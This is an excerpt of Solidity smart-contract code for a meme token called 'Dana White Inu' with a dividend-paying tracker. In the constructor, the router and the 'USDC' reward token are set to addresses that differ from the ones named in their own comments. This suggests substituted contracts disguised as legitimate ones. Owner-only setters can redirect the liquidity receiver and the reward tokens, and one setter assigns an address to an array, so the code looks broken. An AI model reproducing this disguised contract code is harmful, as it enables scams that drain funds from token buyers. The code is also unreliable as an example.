...
contract DividendPayingToken is DividendPayingTokenInterface, DividendPayingTokenOptionalInterface, Ownable {
  ...
  constructor(){
      IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3); // router 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
      uniswapV2Router = _uniswapV2Router; 
      
      // Mainnet

      rewardTokens.push(address(0x78867BbEeF44f2326bF8DDd1941a4439382EF2A7)); // USDC - 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48
...
contract DWI is ERC20, Ownable {
    ...
    address public operationsWallet = 0x5Db590cfE49185aDC5C37840EB48eFd046590C01 ;
    ...
    constructor() ERC20("Dana White Inu", "DWI") {
        ...
        dividendTracker.excludeFromDividends(address(autoLiquidityReceiver));
        
        // exclude from paying fees or having max transaction amount
        excludeFromFees(owner(), true);
        excludeFromFees(address(this), true);
        excludeFromFees(address(0xdead), true);
        excludeFromFees(address(autoLiquidityReceiver), true);
        excludeFromMaxTransaction(owner(), true);
        excludeFromMaxTransaction(address(this), true);
        excludeFromMaxTransaction(address(dividendTracker), true);
        excludeFromMaxTransaction(address(_uniswapV2Router), true);
        excludeFromMaxTransaction(address(0xdead), true);
        excludeFromMaxTransaction(address(autoLiquidityReceiver), true);
    ...
    function setuniswalp(address liqi) external onlyOwner {
        autoLiquidityReceiver = liqi;

    }

    function setrewards(address rewardz) external onlyOwner {
        rewardTokens = rewardz;
